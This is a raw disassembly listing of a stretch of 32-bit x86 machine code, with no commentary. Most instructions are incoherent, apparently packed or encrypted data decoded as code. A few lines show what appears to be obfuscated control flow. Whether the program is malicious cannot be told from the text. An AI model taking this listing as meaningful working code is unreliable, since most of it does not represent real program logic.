  40a96b:	and    bh,BYTE PTR [ebx+0x76e28e99]
  40a971:	mov    bl,0xca
  40a973:	xchg   ebp,eax
  40a974:	xchg   ebp,eax
  40a975:	int    0xc5
  40a977:	inc    ebx
  40a978:	test   DWORD PTR [esi+eax*4],ecx
  40a97b:	mov    al,0xff
  40a97d:	mov    dl,0x4a
  40a97f:	lods   al,BYTE PTR ds:[esi]
  40a980:	in     eax,0x9d
  40a982:	pusha  
  40a983:	xchg   ebx,eax
  40a984:	icebp  
  40a985:	xchg   edx,eax
  40a986:	cli    
  40a987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a988:	dec    edi
  40a989:	jb     0x40a9a8
  40a98b:	sub    al,0x6c
  40a98d:	sbb    eax,0xe8057b6e
  40a992:	not    ebp
  40a994:	mov    ebp,0xb84ed89b
  40a999:	inc    ebx
  40a99a:	xor    al,0x51
  40a99c:	bound  ebp,QWORD PTR [esi-0x68]
  40a99f:	out    0xfb,eax
  40a9a1:	xchg   edx,eax
  40a9a2:	push   esi
  40a9a3:	call   0x315035f3
  40a9a8:	inc    edx
  40a9a9:	push   ebx
  40a9aa:	mov    dh,0xd0
  40a9ac:	dec    edi
  40a9ad:	sti    
  40a9ae:	fld    QWORD PTR [edx-0x47a8992c]
  40a9b4:	jge    0x40aa2f
  40a9b6:	mov    al,0xc9
  40a9b8:	sbb    edi,esi
  40a9ba:	sbb    BYTE PTR [ebx],bl
  40a9bc:	sub    dl,BYTE PTR [ebx]
  40a9be:	repnz iret 
  40a9c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9c1:	sub    BYTE PTR [ebx],dl
  40a9c3:	push   ecx
  40a9c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9c5:	dec    eax
  40a9c6:	inc    ebp
  40a9c7:	xchg   DWORD PTR [eax],ecx
  40a9c9:	test   al,0x26
  40a9cb:	lahf   
  40a9cc:	xor    DWORD PTR [ebp-0x7f],esi
  40a9cf:	scas   al,BYTE PTR es:[edi]
  40a9d0:	test   al,0xb2
  40a9d2:	sti    
  40a9d3:	jns    0x40a990
  40a9d5:	push   esi
  40a9d6:	sahf   
  40a9d7:	(bad)  [esi+0x11]
  40a9da:	jbe    0x40aa06
  40a9dc:	cdq    
  40a9dd:	cdq    
  40a9de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9df:	fs es pop edx
  40a9e2:	cmp    DWORD PTR [eax+0x6],0x45
  40a9e6:	fidiv  DWORD PTR [esi+0x43104081]
  40a9ec:	popa   
  40a9ed:	sub    BYTE PTR [esi+eiz*4-0x185ae6e],0x46
  40a9f5:	imul   ecx,DWORD PTR [esi+0x50],0x1a793783
  40a9fc:	adc    ah,cl
  40a9fe:	fwait
  40a9ff:	jmp    0xce81674
  40aa04:	cwde   
  40aa05:	ret    
  40aa06:	xchg   edi,eax
  40aa07:	clc    
  40aa08:	aas    
  40aa09:	xchg   DWORD PTR [edx+0x4c],ebp
  40aa0c:	sub    BYTE PTR [ebx-0x13],dl
  40aa0f:	out    0x81,eax
  40aa11:	sub    ebp,DWORD PTR [edi-0x894b848]
  40aa17:	pop    esp
  40aa19:	adc    ebx,DWORD PTR [ebp+0x25]
  40aa1c:	xor    bl,al
  40aa1e:	dec    edx
  40aa1f:	cmp    BYTE PTR [esi+edi*4+0x13],ch
  40aa23:	pop    ebx
  40aa24:	cdq    
  40aa25:	dec    ecx
  40aa26:	cmp    ch,cl
  40aa28:	inc    edx
  40aa29:	aad    0xc8
  40aa2b:	jg     0x40aa37
  40aa2d:	cmp    al,bl
  40aa2f:	push   esp
  40aa30:	rcl    DWORD PTR [edi+edi*2],0xaf
  40aa34:	aam    0x4b
  40aa36:	push   es
  40aa37:	into   
  40aa38:	out    dx,al
  40aa39:	test   DWORD PTR [eax],ebp
  40aa3b:	test   al,0x6c
  40aa3d:	sti    
  40aa3e:	dec    eax
  40aa3f:	cwde   
  40aa40:	loop   0x40a9dc
  40aa42:	mov    DWORD PTR [esp+edi*1],edi
  40aa45:	inc    edi
  40aa46:	inc    ebp
  40aa47:	sub    edx,DWORD PTR [edx+0x58a94235]
  40aa4d:	sbb    al,0xdb
  40aa4f:	jecxz  0x40aa9d
  40aa51:	jmp    0xe0e3610d
  40aa56:	mov    WORD PTR [edx+0x1547862f],?
  40aa5c:	mov    ch,0x34
  40aa5e:	pop    esi
  40aa5f:	and    DWORD PTR ds:0xa396a4d7,ecx
  40aa65:	mov    esp,0xf7400add
  40aa6a:	sub    eax,0x9449a8cc
  40aa6f:	mov    dh,0x20
  40aa71:	popa   
  40aa72:	push   edx
  40aa73:	fisttp QWORD PTR [esi+0xf]
  40aa76:	int3   
  40aa77:	add    BYTE PTR [edi],0xe2
  40aa7a:	call   0xe4d0:0xe4bea39f
  40aa81:	out    0xb5,eax
  40aa83:	adc    al,BYTE PTR ds:0xbd669892
  40aa89:	setno  BYTE PTR [esi]
  40aa8c:	sub    bh,bh
  40aa8e:	imul   edi,ecx,0xb6dd8901
  40aa94:	or     DWORD PTR [edi],edx
  40aa96:	ror    DWORD PTR [edx],1
  40aa98:	call   0xda170400
  40aa9d:	xchg   edi,eax
  40aa9e:	dec    esp
  40aa9f:	ret    0xb54f
  40aaa2:	mov    cl,0xea
  40aaa4:	adc    dh,BYTE PTR [eax+0x180c90a2]
  40aaaa:	dec    ecx
  40aaab:	retf   0x8b54
  40aaae:	cmp    BYTE PTR [ebx],bh
  40aab0:	mov    ebx,0xe44bfad0
  40aab5:	adc    DWORD PTR [ecx+0x633dc834],ebx
  40aabb:	sub    dh,BYTE PTR [esi+0xe047d81]
  40aac1:	aam    0x49
  40aac3:	push   es
  40aac4:	push   ds
  40aac5:	movups xmm1,XMMWORD PTR [edx]
  40aac8:	mov    cl,0x7
  40aaca:	js     0x40aa9f
  40aacc:	push   0x37013703
  40aad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aad2:	inc    esp
  40aad3:	imul   edx,DWORD PTR [eax+0x4c],0xffffffde
  40aad7:	(bad)  
  40aad8:	cmc    
  40aad9:	rcr    BYTE PTR [eax+0x34967eda],1
  40aadf:	ffreep st(1)
  40aae1:	dec    ecx
  40aae2:	repnz daa 
  40aae4:	jle    0x40aa8a
  40aae6:	outs   dx,BYTE PTR ds:[esi]
  40aae7:	mov    es,WORD PTR [edi+ebp*1-0x78]
  40aaeb:	addr16 or al,0xfd
  40aaee:	bound  edi,QWORD PTR [edx-0x445fcc73]
  40aaf4:	cli    
  40aaf5:	sub    eax,0x244d096d
  40aafa:	sub    al,BYTE PTR [esi-0x377d3d0e]
  40ab00:	dec    ecx
  40ab01:	and    edi,ecx
  40ab03:	out    dx,al
  40ab04:	sub    eax,0xcf8e5ef7
  40ab09:	jbe    0x40ab35
  40ab0b:	push   edi
  40ab0c:	xor    edi,DWORD PTR [ebx]
  40ab0e:	cmc    
  40ab0f:	fwait
  40ab10:	(bad)  
  40ab11:	int3   
  40ab12:	(bad)  
  40ab14:	push   ss
  40ab15:	xchg   eax,ecx
  40ab17:	js     0x40ab6a
  40ab19:	arpl   WORD PTR [esi-0x1932bd9c],bx
  40ab1f:	jmp    0xac3e:0x9482e510
  40ab26:	repnz in al,0x69
  40ab29:	dec    esp
  40ab2a:	ret    0xcc2e
  40ab2d:	mov    al,0xc3
  40ab2f:	ret    
  40ab30:	mov    WORD PTR [ecx+0x12],ss
  40ab33:	inc    ebx
  40ab34:	jmp    0xdf943abd
  40ab39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab3a:	mov    esp,0x9fb9d6af
  40ab3f:	(bad)  
  40ab40:	or     ecx,eax
  40ab42:	out    0x18,al
  40ab44:	sahf   
  40ab45:	or     al,bl
  40ab47:	mov    bl,0x4d
  40ab49:	mov    ax,0xe2bd
  40ab4d:	and    BYTE PTR [ecx],bh
  40ab4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab50:	dec    ecx
  40ab51:	mov    bh,0xe4
  40ab53:	add    eax,0x95a81a65
  40ab58:	xchg   edx,eax
  40ab59:	sub    DWORD PTR [edi+ebx*1-0x22],eax
  40ab5d:	or     eax,0xce29c9da
  40ab62:	popa   
  40ab63:	cld    
  40ab64:	in     al,dx
  40ab65:	mov    bh,0xb7
  40ab67:	push   edx
  40ab68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab69:	sub    BYTE PTR [edi+0x2a],al
  40ab6c:	retf   0x6e60
  40ab6f:	popf   
  40ab70:	dec    esp
  40ab71:	push   0x3
  40ab73:	nop
  40ab74:	aas    
  40ab75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab76:	sub    ebx,DWORD PTR ds:0xce75e8f4
  40ab7c:	(bad)  
  40ab7d:	in     eax,0x10
  40ab7f:	fcomp  QWORD PTR [ecx]
  40ab81:	sub    edi,DWORD PTR [ebp-0x3e]
  40ab84:	add    BYTE PTR ds:0xd7aefb77,0x29
  40ab8b:	mov    DWORD PTR [ebx],ecx
  40ab8d:	adc    DWORD PTR [esi+0x71b47418],0xd6b24514
  40ab97:	pop    eax
  40ab98:	mov    ds:0xe5ec9074,eax
  40ab9d:	int3   
  40ab9e:	xchg   DWORD PTR [ebp+0x58],ecx
  40aba1:	fstp   DWORD PTR [edi+edi*1]
  40aba4:	mov    ds:0x52a57bcc,al
  40aba9:	loopne 0x40abfa
  40abab:	fs jbe 0x40ac29
  40abae:	pop    ebp
  40abaf:	bound  ebp,QWORD PTR ds:0x72fa4207
  40abb5:	adc    dh,BYTE PTR ds:0x405a5d6e
  40abbb:	clc    
  40abbc:	jno    0x40ab4a
  40abbe:	call   0x801ef8e2
  40abc3:	adc    eax,0x843279ad
  40abc8:	in     al,0xd3
  40abca:	cli    
  40abcb:	pop    eax
  40abcc:	and    al,0x43
  40abce:	push   edx
  40abcf:	adc    ecx,DWORD PTR [esi]
  40abd1:	stos   DWORD PTR es:[edi],eax
  40abd2:	push   DWORD PTR [ebp-0xb389fa5]
  40abd8:	shl    edx,cl
  40abda:	jge    0x40abdb
  40abdc:	push   esi
  40abdd:	or     DWORD PTR [edx],esi
  40abdf:	add    eax,0x87ddcccb
  40abe4:	pop    ecx
  40abe5:	(bad)  
  40abe6:	cmc    
  40abe7:	ins    DWORD PTR es:[edi],dx
  40abe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abe9:	pop    esp
  40abea:	ret    0xdcfe
  40abed:	in     eax,dx
  40abee:	xchg   edi,eax
  40abef:	out    0xc9,al
  40abf1:	inc    ebp
  40abf2:	leave  
  40abf3:	in     al,dx
  40abf4:	xchg   ebx,eax
  40abf5:	dec    edx
  40abf6:	adc    DWORD PTR [eax+0x61],ecx
  40abf9:	lock jp 0x40ab81
  40abfc:	retf   0xa7a4
  40abff:	push   ecx
  40ac00:	sti    
  40ac01:	and    BYTE PTR [eax+0x29],bh
  40ac04:	sar    BYTE PTR [esi+0x29c74474],1
  40ac0a:	lahf   
  40ac0b:	cmp    al,BYTE PTR [edx+0x1cfd3853]
  40ac11:	and    BYTE PTR [ebp+0x3accd],ch
  40ac17:	mov    esp,0xe2778764
  40ac1c:	mov    esi,DWORD PTR [ebx]
  40ac1e:	mov    edx,0x5325e967
  40ac23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac24:	loope  0x40ac27
  40ac26:	xchg   cl,bh
  40ac28:	mov    cl,0x87
  40ac2a:	popa   
  40ac2b:	rol    BYTE PTR cs:[edx-0x10],1
  40ac2f:	mov    WORD PTR [edi-0x140c8fcd],ss
  40ac35:	scas   al,BYTE PTR es:[edi]
  40ac36:	call   0x5ecf062e
  40ac3b:	lds    eax,FWORD PTR [edx+0x45]
  40ac3e:	nop
  40ac3f:	pop    ebp
  40ac40:	xor    BYTE PTR [ebp+ebx*4-0x64eadb0c],al
  40ac47:	sbb    ebx,DWORD PTR [ecx+0x71]
  40ac4a:	pop    ebx
  40ac4b:	gs xchg BYTE PTR gs:[esi],dh
  40ac4f:	mov    edx,0x2d112d7f
  40ac54:	adc    eax,0xcf77551
  40ac59:	inc    ebx
  40ac5a:	jge    0x40acad
  40ac5c:	or     eax,0x20874e78
  40ac61:	mov    al,0x2b
  40ac63:	dec    edx
  40ac64:	test   BYTE PTR [ebx+0x50],ah
  40ac67:	push   eax
  40ac68:	arpl   WORD PTR [ebp+esi*1+0x6816f45d],dx
  40ac6f:	mov    ds,WORD PTR ss:[edx-0x50207c8d]
  40ac76:	or     BYTE PTR [ebp+ecx*1-0x46],al
  40ac7a:	mov    dh,0xba
  40ac7c:	out    0xf7,al
  40ac7e:	sbb    edi,DWORD PTR ds:0xb22c9635
  40ac84:	out    0xb5,al
  40ac86:	ja     0x40ac54
  40ac88:	or     ebp,DWORD PTR [ebx]
  40ac8a:	clc    
  40ac8b:	call   0x7a3e:0x12f6
  40ac91:	mov    dh,0xcb
  40ac93:	pop    esi
  40ac94:	jns    0x40accf
  40ac96:	push   ecx
  40ac97:	fstp   DWORD PTR [edx]
  40ac99:	pop    ebp
  40ac9a:	fcomip st,st(2)
  40ac9c:	into   
  40ac9d:	jmp    0xdb4a38a
  40aca2:	xor    eax,0x4ae75531
  40aca7:	sbb    al,0x5d
  40aca9:	sub    DWORD PTR [esp+eax*1-0x1be5d12a],edi
  40acb0:	aas    
  40acb1:	sub    eax,0x4ed7bfd6
  40acb6:	or     DWORD PTR [edx],esi
  40acb8:	ins    BYTE PTR es:[edi],dx
  40acb9:	ja     0x40ad0a
  40acbb:	std    
  40acbc:	or     al,0x85
  40acbe:	add    al,0x4d
  40acc0:	sub    BYTE PTR [ecx+esi*4],al
  40acc3:	mov    ch,0xb
  40acc5:	mov    edi,0x495fc746
  40acca:	sbb    esp,esi
  40accc:	in     eax,dx
  40accd:	mov    dl,0xa9
  40accf:	dec    ebp
  40acd0:	out    dx,al
  40acd1:	or     BYTE PTR [ebp-0x3c],0x9
  40acd5:	mov    ecx,gs
  40acd7:	and    ch,0x4
  40acda:	fiadd  DWORD PTR [edi-0x4ee5060d]
  40ace0:	jne    0x40ad57
  40ace2:	xchg   edx,eax
  40ace3:	sub    ecx,DWORD PTR [edi+0x6]
  40ace6:	mov    bh,0x50
  40ace8:	mov    edx,0x7ebf08b3
  40aced:	mov    edx,0x38d5f868
  40acf2:	cmp    eax,0x8a37aacb
  40acf7:	mov    edx,0xa2757a4f
  40acfc:	pop    ebx
  40acfd:	xor    dh,ah
  40acff:	pop    eax
  40ad00:	sub    ebx,edx
  40ad02:	hlt    
  40ad03:	fwait
  40ad04:	add    eax,0x96007b3c
  40ad09:	idiv   al
  40ad0b:	sbb    DWORD PTR gs:[edx+0x4a7624fa],edx
  40ad12:	cld    
  40ad13:	adc    al,0x30
  40ad15:	and    al,0x78
  40ad17:	test   al,0x16
  40ad19:	test   al,0x94
  40ad1b:	test   eax,0xa5b6fad
  40ad20:	xor    edi,DWORD PTR [eax-0x2e005671]
  40ad26:	dec    esp
  40ad27:	loopne 0x40ad3f
  40ad29:	jb     0x40acad
  40ad2b:	sub    esp,eax
  40ad2d:	xchg   DWORD PTR [esi+0x13afc0f6],esi
  40ad33:	fsubp  st(0),st
  40ad35:	int3   
  40ad36:	(bad)  
  40ad37:	fbstp  TBYTE PTR [esi-0x46678dc5]
  40ad3d:	mov    al,0xe5
  40ad3f:	mov    ecx,eax
  40ad41:	mov    esp,0x3465f44e
  40ad46:	lock push edx
  40ad48:	mov    ebx,0x7d0083a0
  40ad4d:	pop    es
  40ad4e:	mov    al,ds:0xd30323d5
  40ad53:	xor    al,0x4
  40ad55:	cmc    
  40ad56:	arpl   WORD PTR [esi],di
  40ad58:	xchg   edi,eax
  40ad59:	sti    
  40ad5a:	sbb    BYTE PTR [esp+ecx*4],0x7e
  40ad5e:	pushf  
  40ad5f:	or     DWORD PTR [ebp+ebx*2-0x7f1085fa],esi
  40ad66:	jg     0x40ad49
  40ad68:	addr16 pop esi
  40ad6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad6b:	clc    
  40ad6c:	sub    BYTE PTR [edi],0xb1
  40ad6f:	add    ah,BYTE PTR [edi-0x4]
  40ad72:	mov    bl,0x51
  40ad74:	mov    cl,BYTE PTR [ecx-0x32b7751f]
  40ad7a:	dec    edi
  40ad7b:	das    
  40ad7c:	cmc    
  40ad7d:	icebp  
  40ad7e:	xor    DWORD PTR [edi+0x6e27e80e],0x9e140c16
  40ad88:	pusha  
  40ad89:	inc    eax
  40ad8a:	mov    bl,0x5a
  40ad8c:	mov    al,ds:0x92941961
  40ad91:	and    ebp,edi
  40ad93:	jb     0x40ad90
  40ad95:	leave  
  40ad96:	les    edx,FWORD PTR [esi+0x4c]
  40ad99:	xchg   esi,eax
  40ad9a:	cmp    BYTE PTR [ecx],dl
  40ad9c:	dec    ebp
  40ad9d:	lahf   
  40ad9e:	loope  0x40ad55
  40ada0:	enter  0x681,0x80
  40ada4:	outs   dx,DWORD PTR ds:[esi]
  40ada5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ada6:	inc    ebx
  40ada7:	ins    BYTE PTR es:[edi],dx
  40ada8:	adc    al,0x77
  40adaa:	clc    
  40adab:	or     dh,BYTE PTR [ecx+esi*4]
  40adae:	(bad)  
  40adaf:	lock mov esi,0x232dfa07
  40adb5:	cmp    DWORD PTR [ecx],0x3dcbe27c
  40adbb:	or     BYTE PTR [eax-0x74],al
  40adbe:	pop    ecx
  40adbf:	sti    
  40adc0:	jae    0x40ae2b
  40adc2:	xor    BYTE PTR ds:0x63600ac3,bl
  40adc8:	daa    
  40adc9:	jg     0x40ae1b
  40adcb:	pop    esi
  40adcc:	ret    0xf429
  40adcf:	mov    eax,esi
  40add1:	mov    WORD PTR [esi],ss
  40add3:	pop    esp
  40add4:	ss xor bh,ch
  40add7:	aad    0xb9
  40add9:	dec    ebp
  40adda:	aaa    
  40addb:	sbb    ch,bl
  40addd:	inc    esp
  40adde:	mov    al,0xfe
  40ade0:	cwde   
  40ade1:	aam    0x14
  40ade3:	xchg   esp,eax
  40ade4:	xor    eax,DWORD PTR [edx+0x8]
  40ade7:	int    0x7f
  40ade9:	stos   BYTE PTR es:[edi],al
  40adea:	pop    esi
  40adeb:	out    0x9e,eax
  40aded:	push   ebx
  40adee:	fist   DWORD PTR [ecx+eax*4-0x5afb8a7d]
  40adf5:	jg     0x40ae1a
  40adf7:	push   esp
  40adf8:	in     al,0xc4
  40adfa:	adc    al,0x93
  40adfc:	push   0xffffff9c
  40adfe:	int3   
  40adff:	xchg   ebx,eax
  40ae00:	push   0x653dee40
  40ae05:	jo     0x40ae61
  40ae07:	stos   DWORD PTR es:[edi],eax
  40ae08:	jno    0x40ae41
  40ae0a:	arpl   WORD PTR [ebx+0x276f1323],si
  40ae10:	loopne 0x40ae8f
  40ae12:	ror    esi,0x39
  40ae15:	bound  edx,QWORD PTR [ecx+0x36c0c66a]
  40ae1b:	fcomp  QWORD PTR [eax-0xa]
  40ae1e:	sbb    BYTE PTR [ecx+edx*2-0x5],ch
  40ae22:	xchg   esi,eax
  40ae23:	push   cs
  40ae24:	cwde   
  40ae25:	adc    edi,DWORD PTR [edx]
  40ae27:	jle    0x40ae98
  40ae29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae2a:	jl     0x40adb6
  40ae2c:	pushf  
  40ae2d:	sbb    dh,BYTE PTR [eax-0xe9d41d6]
  40ae33:	jle    0x40adbb
  40ae35:	pop    es
  40ae36:	cmp    eax,0x19c7620d
  40ae3b:	into   
  40ae3c:	sub    esi,DWORD PTR [edx-0x6b]
  40ae3f:	pop    esi
  40ae40:	pop    ecx
  40ae41:	xor    eax,eax
  40ae43:	inc    esp
  40ae44:	loope  0x40aec0
  40ae46:	icebp  
  40ae47:	cmp    ah,BYTE PTR [ebx-0x56]
  40ae4a:	sbb    bh,BYTE PTR [ebp*4-0x4e27cc51]
  40ae51:	add    ebp,DWORD PTR [esi]
  40ae53:	xchg   ecx,eax
  40ae54:	lea    eax,[eax+eiz*8]
  40ae57:	fstp   DWORD PTR [esi-0x3accb6c7]
  40ae5d:	or     eax,esp
  40ae5f:	fisttp DWORD PTR [ebx+edi*2]
  40ae62:	pop    esp
  40ae63:	sbb    al,0x59
  40ae65:	mov    DWORD PTR [edi],ebx
  40ae67:	int    0x11
  40ae69:	leave  
  40ae6a:	sub    al,0xcc
  40ae6c:	fidivr WORD PTR [ebx+0x1]
  40ae6f:	adc    BYTE PTR [ebx+0x1b1aeacc],0x1e
  40ae76:	fdiv   DWORD PTR [ecx+0x62ee248]
  40ae7c:	fdiv   QWORD PTR [ebx]
  40ae7e:	mov    bh,0xa0
  40ae80:	rol    DWORD PTR [edx],cl
  40ae82:	jle    0x40ae5e
  40ae84:	inc    esi
  40ae85:	add    ch,BYTE PTR [esi-0x30ba2d5b]
  40ae8b:	pop    ecx
  40ae8c:	pusha  
  40ae8d:	jbe    0x40aefc
  40ae8f:	stos   DWORD PTR es:[edi],eax
  40ae90:	sub    dl,BYTE PTR [ebx-0x62]
  40ae93:	jo     0x40ae36
  40ae95:	fisttp DWORD PTR [edi+edx*4]
  40ae98:	bndldx bnd3,[ebx-0x563d7eae]
  40ae9f:	aaa    
  40aea0:	jmp    0x5c6b231a
  40aea5:	retf   
  40aea6:	data16 lahf 
  40aea8:	adc    DWORD PTR [esi+0x4b70fcd],esi
  40aeae:	pop    eax
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx+0x7dbaa730],al
  40aef6:	call   esp
  40aef8:	or     BYTE PTR [ecx],0x7b
  40aefb:	jnp    0x40af10
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	xchg   BYTE PTR [edi],ah
  40af02:	stc    
  40af03:	mov    WORD PTR [ecx-0x32],cs
  40af06:	or     DWORD PTR [ebp+0x28],ecx
  40af09:	mov    dh,bh
  40af0b:	add    DWORD PTR [ecx+0x3],0x27
  40af0f:	pop    esi
  40af10:	cwde   
  40af11:	dec    eax
  40af12:	cmp    eax,0xfc946361
  40af17:	sbb    eax,0x46304965
  40af1c:	sbb    BYTE PTR [ecx+0x74371000],0x5f
  40af23:	cmp    dl,BYTE PTR [ebx]
  40af25:	(bad)  
  40af26:	inc    esi
  40af27:	aad    0x45
  40af29:	retf   
  40af2a:	pop    eax
  40af2b:	jge    0x40aec6
  40af2d:	xchg   esi,eax
  40af2e:	adc    BYTE PTR ds:0xc36d0f4e,bl
  40af34:	adc    ebx,esi
  40af36:	adc    eax,0x8778c174
  40af3b:	mov    edx,0xcc6a8ad0
  40af40:	jmp    0xab4a:0x91125881
  40af47:	xchg   ebx,eax
  40af48:	loop   0x40af55
  40af4a:	dec    eax
  40af4b:	adc    al,0x67
  40af4d:	pop    ebx
  40af4e:	fstp   DWORD PTR [esi-0x2c]
  40af51:	jge    0x40af90
  40af53:	mov    ebx,0xcd458bef
  40af58:	jl     0x40aef6
  40af5a:	xchg   ecx,esi
  40af5c:	xchg   ebp,eax
  40af5d:	or     edi,esp
  40af5f:	adc    BYTE PTR [ebx+0x2473f318],bh
  40af65:	hlt    
  40af66:	xchg   BYTE PTR [ebx],dh
  40af68:	push   edi
  40af69:	adc    al,0x31
  40af6b:	mov    ch,0xc2
  40af6d:	inc    edx
  40af6e:	cmp    al,0xdc
  40af70:	cmp    al,0xe7
  40af72:	test   DWORD PTR [esi],0xbcae5152
  40af78:	adc    al,0xc8
  40af7a:	test   BYTE PTR [eax-0x7c4baf2b],al
  40af80:	adc    bl,bl
  40af82:	scas   eax,DWORD PTR es:[edi]
  40af83:	inc    ebp
  40af84:	lods   al,BYTE PTR ds:[esi]
  40af85:	and    bh,BYTE PTR [eax-0x4b]
  40af88:	mov    esp,0x16ec0f1a
  40af8d:	adc    ebp,DWORD PTR [eax+0x66e6ad21]
  40af93:	aad    0xbe
  40af95:	mov    ecx,0xf4f92764
  40af9a:	(bad)  
  40af9b:	xchg   ecx,eax
  40af9c:	inc    ecx
  40af9d:	stos   BYTE PTR es:[edi],al
  40af9e:	fist   DWORD PTR [ecx-0x398e577d]
  40afa4:	push   cs
  40afa5:	add    al,0xc8
  40afa7:	jmp    0x4e56:0x3af932db
  40afae:	push   esp
  40afaf:	lock add ah,BYTE PTR [edi-0x38]
  40afb3:	mov    ds:0x3b4c0efc,al
  40afb8:	lea    ecx,[esp+eiz*4-0x64]
  40afbc:	sbb    BYTE PTR [eax],dl
  40afbe:	lahf   
  40afbf:	jmp    0x5671:0x230e17d
  40afc6:	xor    DWORD PTR [esi-0x13fc3cee],0xffffff82
  40afcd:	ins    BYTE PTR es:[edi],dx
  40afce:	es loopne 0x40af6c
  40afd1:	cs int3 
  40afd3:	adc    eax,0x3cb4f698
  40afd8:	clc    
  40afd9:	push   edi
  40afda:	aas    
  40afdb:	xchg   esp,eax
  40afdc:	sbb    DWORD PTR [esi+ebp*4],ebp
  40afdf:	stos   BYTE PTR es:[edi],al
  40afe0:	inc    esp
  40afe1:	test   BYTE PTR [ecx-0x25e59e73],dl
  40afe7:	imul   edx,DWORD PTR [ebx-0x52],0x19e68e94
  40afee:	cmp    al,0xb5
  40aff0:	cmp    DWORD PTR [edx+ecx*8+0x3d],0x23
  40aff5:	test   eax,0x1d743fb9
  40affa:	add    al,0xaa
  40affc:	mov    eax,0xa07d4510
  40b001:	sub    BYTE PTR [esi],dl
  40b003:	jns    0x40afdc
  40b005:	pop    esp
  40b006:	jge    0x40b033
  40b008:	cs das 
  40b00a:	cvtps2pd xmm5,xmm1
  40b00d:	adc    BYTE PTR [edi-0x58735ec2],al
  40b013:	dec    esi
  40b014:	push   eax
  40b015:	dec    ebx
  40b016:	aam    0x69
  40b018:	jo     0x40b025
  40b01a:	pop    ecx
  40b01b:	mov    bh,0x76
  40b01d:	xor    al,0x2f
  40b01f:	mov    dh,0x6e
  40b021:	xchg   ebx,eax
  40b022:	inc    ebp
  40b023:	or     esi,DWORD PTR [ebp+0x397823d7]
  40b029:	jg     0x40afc3
  40b02b:	cmp    DWORD PTR [esp-0x70],edi
  40b02f:	idiv   BYTE PTR [esi+0x76ee24dc]
  40b035:	or     al,0x7a
  40b037:	pop    ds
  40b038:	mov    edi,0xfb087409
  40b03d:	test   al,0x78
  40b03f:	(bad)  
  40b040:	in     al,0xbf
  40b042:	mov    ecx,0xad7d67f5
  40b047:	pop    ds
  40b048:	xchg   ecx,eax
  40b049:	xchg   ebx,eax
  40b04a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b04b:	jmp    0xb838:0xec20731e
  40b052:	push   ss
  40b053:	rcl    ah,1
  40b055:	sub    eax,0xd0e88e4d
  40b05a:	test   DWORD PTR [eax+0x654bec98],ebp
  40b060:	pusha  
  40b061:	jne    0x40b06e
  40b063:	shl    DWORD PTR [esi+esi*8+0x46626556],1
  40b06a:	(bad)
  40b06d:	dec    edx
  40b06e:	imul   ebx,DWORD PTR [edx+edx*4],0x52
  40b072:	into   
  40b073:	sti    
  40b074:	jmp    0x40b0ee
  40b076:	sbb    al,0x20
  40b078:	bound  ebx,QWORD PTR [eax-0x46f395e3]
  40b07e:	(bad)  
  40b07f:	scas   al,BYTE PTR es:[edi]
  40b080:	jle    0xf9af9b10
  40b086:	ror    BYTE PTR [eax],cl
  40b088:	add    DWORD PTR [ebx-0x60599e4e],esp
  40b08e:	jge    0x40b0f7
  40b090:	mov    bh,0x9a
  40b092:	xor    BYTE PTR [esi+0x4dce8b75],0x4d
  40b099:	add    eax,0xfcaca647
  40b09e:	or     bl,BYTE PTR [ecx-0x39]
  40b0a1:	aam    0xec
  40b0a3:	ret    
  40b0a4:	inc    edx
  40b0a5:	gs loope 0x40b033
  40b0a8:	pop    esp
  40b0a9:	pop    es
  40b0aa:	enter  0xaee4,0xb0
  40b0ae:	jecxz  0x40b11c
  40b0b0:	jae    0x40b0c0
  40b0b2:	or     ebx,DWORD PTR [ecx]
  40b0b4:	cmp    ecx,DWORD PTR [edi+0x69d3348b]
  40b0ba:	pusha  
  40b0bb:	sbb    edi,DWORD PTR [ebp+0x5b]
  40b0be:	xor    BYTE PTR ds:0x430c889e,bh
  40b0c4:	ss pop edx
  40b0c6:	dec    ebx
  40b0c7:	and    ebp,DWORD PTR [edx]
  40b0c9:	cmp    al,0x3c
  40b0cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0cc:	fadd   QWORD PTR [eax]
  40b0ce:	nop
  40b0cf:	loop   0x40b147
  40b0d1:	cdq    
  40b0d2:	and    ebp,DWORD PTR [ecx-0x3c2e8adc]
  40b0d8:	lods   eax,DWORD PTR ds:[esi]
  40b0d9:	out    dx,al
  40b0da:	mov    ah,0x29
